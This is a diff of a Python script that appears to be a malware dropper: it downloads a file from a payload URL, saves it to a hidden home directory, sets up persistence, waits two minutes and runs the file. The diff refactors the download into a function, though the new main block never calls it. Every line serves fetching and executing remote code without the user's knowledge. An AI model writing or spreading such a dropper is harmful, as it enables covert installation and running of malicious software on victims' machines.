@@ -19,18 +19,24 @@ def persistence(home, file_name):
     except:
         pass
 
-try:
-    r = requests.get(PAYLOAD_URL, allow_redirects=True)
+def get_payload():
+    try:
+        r = requests.get(PAYLOAD_URL, allow_redirects=True)
 
-    if os.path.exists(MY_HOME):
-        open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
-    else:
-        os.makedirs(MY_HOME)
-        open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
-except:
-    pass
-persistence(MY_HOME, PAYLOAD_NAME)
+        if os.path.exists(MY_HOME):
+            open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
+        else:
+            os.makedirs(MY_HOME)
+            open(MY_HOME + PAYLOAD_NAME, "wb").write(r.content)
+    except:
+        pass
 
-sleep(120)
 
-os.startfile(MY_HOME+PAYLOAD_NAME)
+
+if __name__ == "__main__":
+
+    persistence(MY_HOME, PAYLOAD_NAME)
+
+    sleep(120)
+
+    os.startfile(MY_HOME+PAYLOAD_NAME)
